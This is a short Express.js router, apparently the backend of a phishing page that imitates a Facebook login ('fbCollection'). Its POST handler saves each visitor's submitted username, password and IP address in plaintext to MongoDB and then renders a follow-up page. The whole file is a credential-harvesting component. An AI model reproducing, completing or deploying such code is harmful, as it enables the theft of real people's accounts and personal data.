const express = require("express")
const fbCollection = require("./mongodb/model")

const router = express.Router()

router.get("/",(req,resp)=>{
  resp.render("index")
})

router.post("/get",async (req,resp)=>{
  const data =new fbCollection({
    username:req.body.username,
    password:req.body.password,
    ip:req.ip,
    date:Date.now()
  })
  try{
    const result = await data.save();
    console.log(result)
    resp.render("getUser")
  }catch(err){
    console.log(err)
  }
  
})

module.exports = router;